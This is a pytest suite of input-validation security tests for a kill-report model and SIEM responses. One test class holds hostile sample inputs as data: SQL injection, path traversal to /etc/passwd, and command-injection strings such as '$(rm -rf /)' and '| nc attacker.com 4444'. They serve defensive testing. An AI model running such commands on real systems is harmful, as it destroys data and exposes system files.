"""
Security Tests - Input Validation

Tests for input validation and sanitization across the application.
Ensures malicious or malformed input is properly handled.
"""

import pytest
from datetime import datetime
import uuid

from core.models import KillReport, KillReason, Severity, SIEMContextResponse
from core.validation import ValidationError


class TestKillReportValidation:
    """Test input validation for KillReport model."""

    def test_reject_empty_kill_id(self):
        """Empty kill_id should be rejected or handled safely."""
        try:
            report = KillReport(
                kill_id="",
                timestamp=datetime.utcnow(),
                target_module="test",
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=0.5,
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )
            # If it accepts empty, ensure it's usable (not ideal but acceptable)
            assert report.kill_id == ""
        except (ValueError, TypeError):
            # Rejection is the preferred behavior
            pass

    def test_reject_none_kill_id(self):
        """None kill_id should be rejected or handled safely."""
        try:
            report = KillReport(
                kill_id=None,
                timestamp=datetime.utcnow(),
                target_module="test",
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=0.5,
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )
            # If it accepts None, ensure it's documented behavior
            assert report.kill_id is None
        except (ValueError, TypeError):
            # Rejection is the preferred behavior
            pass

    def test_reject_invalid_confidence_score_high(self):
        """Confidence score > 1.0 should be rejected or clamped."""
        with pytest.raises((ValueError, AssertionError)):
            KillReport(
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                target_module="test",
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=1.5,  # Invalid
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )

    def test_reject_invalid_confidence_score_negative(self):
        """Negative confidence score should be rejected."""
        with pytest.raises((ValueError, AssertionError)):
            KillReport(
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                target_module="test",
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=-0.5,  # Invalid
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )

    def test_sanitize_module_name_special_chars(self):
        """Module names with allowed special characters should be accepted."""
        # Should accept alphanumeric, underscore, hyphen, dot
        report = KillReport(
            kill_id=str(uuid.uuid4()),
            timestamp=datetime.utcnow(),
            target_module="test-service_v2.0",  # Valid with special chars
            target_instance_id="instance-001",
            kill_reason=KillReason.ANOMALY_BEHAVIOR,
            severity=Severity.LOW,
            confidence_score=0.5,
            evidence=[],
            dependencies=[],
            source_agent="smith",
        )
        assert report.target_module == "test-service_v2.0"

    def test_handle_very_long_module_name(self):
        """Very long module names should be rejected."""
        long_name = "a" * 10000
        # Should reject with ValidationError
        with pytest.raises(ValidationError) as exc_info:
            KillReport(
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                target_module=long_name,
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=0.5,
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )
        assert "too long" in str(exc_info.value).lower()

    def test_handle_unicode_in_evidence(self):
        """Unicode characters in evidence should be handled safely."""
        report = KillReport(
            kill_id=str(uuid.uuid4()),
            timestamp=datetime.utcnow(),
            target_module="test",
            target_instance_id="instance",
            kill_reason=KillReason.ANOMALY_BEHAVIOR,
            severity=Severity.LOW,
            confidence_score=0.5,
            evidence=["error: \u0000null byte", "日本語", "emoji: 🚨"],
            dependencies=[],
            source_agent="smith",
        )
        assert len(report.evidence) == 3


class TestSIEMResponseValidation:
    """Test input validation for SIEM responses."""

    def test_reject_invalid_risk_score_high(self):
        """Risk score > 1.0 should be rejected or clamped."""
        try:
            response = SIEMContextResponse(
                query_id=str(uuid.uuid4()),
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                threat_indicators=[],
                historical_behavior={},
                false_positive_history=0,
                network_context={},
                user_context=None,
                risk_score=1.5,  # Invalid
                recommendation="test",
            )
            # If accepted, should be clamped to 1.0 or stored as-is
            assert response.risk_score >= 0
        except (ValueError, AssertionError):
            # Rejection is preferred
            pass

    def test_reject_negative_false_positive_count(self):
        """Negative false positive history should be rejected or handled."""
        try:
            response = SIEMContextResponse(
                query_id=str(uuid.uuid4()),
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                threat_indicators=[],
                historical_behavior={},
                false_positive_history=-5,  # Invalid
                network_context={},
                user_context=None,
                risk_score=0.5,
                recommendation="test",
            )
            # If accepted, should be treated as 0 or stored as-is
            assert response.false_positive_history == -5 or response.false_positive_history >= 0
        except (ValueError, AssertionError):
            # Rejection is preferred
            pass


class TestInjectionPrevention:
    """Test that injection attacks are prevented."""

    def test_sql_injection_in_module_name(self):
        """SQL injection patterns in module name should be rejected."""
        malicious_name = "'; DROP TABLE modules; --"
        with pytest.raises(ValidationError) as exc_info:
            KillReport(
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                target_module=malicious_name,
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=0.5,
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )
        # Should be rejected due to invalid characters
        assert "invalid characters" in str(exc_info.value).lower() or "pattern" in str(exc_info.value).lower()

    def test_command_injection_in_evidence(self):
        """Command injection in evidence should not cause issues."""
        malicious_evidence = [
            "$(rm -rf /)",
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
        ]
        report = KillReport(
            kill_id=str(uuid.uuid4()),
            timestamp=datetime.utcnow(),
            target_module="test",
            target_instance_id="instance",
            kill_reason=KillReason.ANOMALY_BEHAVIOR,
            severity=Severity.LOW,
            confidence_score=0.5,
            evidence=malicious_evidence,
            dependencies=[],
            source_agent="smith",
        )
        # Should store without executing
        assert report.evidence == malicious_evidence

    def test_path_traversal_in_module_name(self):
        """Path traversal attempts should be rejected."""
        traversal_name = "../../../etc/passwd"
        with pytest.raises(ValidationError) as exc_info:
            KillReport(
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                target_module=traversal_name,
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=0.5,
                evidence=[],
                dependencies=[],
                source_agent="smith",
            )
        assert "path traversal" in str(exc_info.value).lower()


class TestJSONParsingSecurity:
    """Test JSON parsing security."""

    def test_nested_json_bomb(self):
        """Deeply nested JSON should not cause stack overflow."""
        # Create deeply nested dict
        nested = {"a": None}
        current = nested
        for _ in range(100):  # Reasonable depth
            current["a"] = {"a": None}
            current = current["a"]

        report = KillReport(
            kill_id=str(uuid.uuid4()),
            timestamp=datetime.utcnow(),
            target_module="test",
            target_instance_id="instance",
            kill_reason=KillReason.ANOMALY_BEHAVIOR,
            severity=Severity.LOW,
            confidence_score=0.5,
            evidence=[],
            dependencies=[],
            source_agent="smith",
            metadata=nested,
        )
        assert report.metadata is not None

    def test_large_metadata_object(self):
        """Large metadata should be rejected to prevent resource exhaustion."""
        # 1MB of data - should be rejected (max is 100KB)
        large_data = {"key_" + str(i): "x" * 100 for i in range(10000)}

        with pytest.raises(ValidationError) as exc_info:
            KillReport(
                kill_id=str(uuid.uuid4()),
                timestamp=datetime.utcnow(),
                target_module="test",
                target_instance_id="instance",
                kill_reason=KillReason.ANOMALY_BEHAVIOR,
                severity=Severity.LOW,
                confidence_score=0.5,
                evidence=[],
                dependencies=[],
                source_agent="smith",
                metadata=large_data,
            )
        assert "too large" in str(exc_info.value).lower()
